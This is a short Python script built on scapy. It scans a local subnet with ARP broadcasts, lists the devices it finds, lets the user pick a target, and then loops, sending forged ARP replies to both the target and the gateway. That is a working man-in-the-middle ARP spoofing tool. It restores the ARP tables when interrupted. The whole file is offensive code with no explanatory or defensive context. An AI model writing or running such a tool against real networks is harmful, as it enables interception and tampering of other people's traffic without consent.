from scapy.all import ARP, Ether, srp, send
import time

class network_device:
  def __init__(self, ip, mac):
    self.ip = ip
    self.mac = mac

def scan_network(target_network):
    arp = ARP(pdst=target_network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    network_devices = []

    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]

    for sent, received in result:
        device = network_device(received.psrc, received.hwsrc)
        network_devices.append(device)

    return [ network_devices[1:], network_devices[0] ]

def spoof(target, spoof):
    spoof_packet = ARP(op = 2, pdst = target.ip, hwdst = target.mac, psrc = spoof.ip)
    send(spoof_packet, verbose = False)

def restore(source, destination):
    restore_packet = ARP(op = 2, pdst = destination.ip, hwdst = destination.mac, psrc = source.ip, hwsrc = source.mac)
    send(restore_packet, count = 1, verbose = False)

def main():
    target_net = "10.0.0.1/24"
    network = scan_network(target_net)

    gateway = network[1]
    attacker = network_device(0, Ether().src)
    network_devices = network[0]

    print("Available devices in the network:")
    print("IP" + " "*18+"MAC")

    print("{:16}    {} - {}".format(gateway.ip, gateway.mac, "Gateway"))
    i = 0 
    for device in network_devices:
        if(device.mac == attacker.mac):
            print("{:16}    {} - {}".format(device.ip, device.mac,"You"))
            attacker.ip = device.ip 
            i = i + 1
        else:
            print("{:16}    {} - [{}]".format(device.ip, device.mac,i))
            i = i + 1

    #print('Select target',"0 through", i, end='\r')
    target = network_devices[int(input('Select target in range: '))]

    print(gateway.ip)
    print(target.ip)
    print(attacker.ip)

    packets_sent = 0
    try:
        while True:
            spoof(target, gateway)
            spoof(gateway, target)
            packets_sent += 2
            print("\r[+] Packets Sent: {}".format(packets_sent), end = "")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Ctrl + C..... Restoring the ARP Tables..... Be Patient")
        restore(target, gateway)
        restore(gateway, target)

main()